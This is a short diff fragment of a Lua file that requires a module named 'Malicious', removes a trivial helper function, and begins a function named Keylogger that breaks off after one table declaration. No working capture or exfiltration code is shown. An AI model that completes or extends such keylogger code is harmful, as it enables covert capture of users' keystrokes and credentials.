@@ -1,11 +1,5 @@
 ﻿local mylib = require("Malicious")
 
-function LuaOK()
-
-	return "Ok"
-
-end
-
 function Keylogger()
 	
 	local Pressed = {}
